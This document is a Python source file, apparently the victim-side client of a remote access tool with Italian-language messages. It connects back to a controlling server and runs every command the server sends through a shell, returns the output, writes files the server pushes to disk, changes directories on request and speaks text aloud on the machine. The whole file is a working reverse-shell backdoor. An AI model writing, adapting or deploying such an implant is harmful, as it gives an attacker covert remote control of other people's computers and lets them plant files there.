import os
import pyttsx3
import subprocess
import helpers as hlp
from termcolor import cprint
from helpers import BudaSocket, decode


def run_command(command: str):
    p = subprocess.run(command, shell=True, capture_output=True)
    return p.stdout, p.stderr


def speak(speech: str):
    engine.say(speech)
    engine.runAndWait()


if __name__ == '__main__':
    host = hlp.argv_or_default(1, '127.0.0.1')
    port = hlp.argv_or_default(2, 12345)
    
    run_command('chcp 65001')

    engine = pyttsx3.init()
    engine.setProperty('rate', 125)

    conn_loop = True
    while conn_loop:
        with BudaSocket.get_client(host, port) as client:
            try:
                while True:
                    client.send(os.getcwd())
                    data = client.recv()

                    if data.startswith(b'<filename>'):
                        file_name = data.removeprefix(b'<filename>').split(b'</filename>')[0]
                        file_data = data.split(b'</filename>')[1]
                        with open(file_name, 'wb') as file:
                            file.write(file_data)
                        client.send('File mandato con successo\n')
                    else:
                        cmd = decode(data)

                        if cmd == 'gn':
                            cprint('Buonanotte', 'magenta')
                            conn_loop = False
                            break
                        elif cmd.startswith('cd') and cmd != "cd":
                            cmd = hlp.fix_white_spaces(cmd)
                            try:
                                os.chdir('..' if cmd == 'cd..' else cmd[3:])
                                client.send('Directory cambiata\n')
                            except FileNotFoundError:
                                client.send('Directory non valida\n')
                            continue
                        elif cmd.startswith('speak'):
                            try:
                                speak(' '.join(cmd.split()[1:]))
                                client.send('Comando "speak" eseguito correttamente\n')
                            except IndexError:
                                client.send('Parametri comando "speak" non validi\n')
                            continue
                        elif cmd.startswith('sendtoslave'):
                            cmd_split = cmd.split()

                            if len(cmd_split) == 2:
                                file_name = cmd_split[1].split('\\')[-1]
                            elif len(cmd_split) == 3:
                                file_name = cmd_split[2]

                        output, error = run_command(cmd)
                        client.send(output or error or ' ')
            except ConnectionResetError:
                hlp.print_error('Connessione resettata dal server', False)
            except ConnectionAbortedError:
                hlp.print_error('Connessione annullata dal server', False)
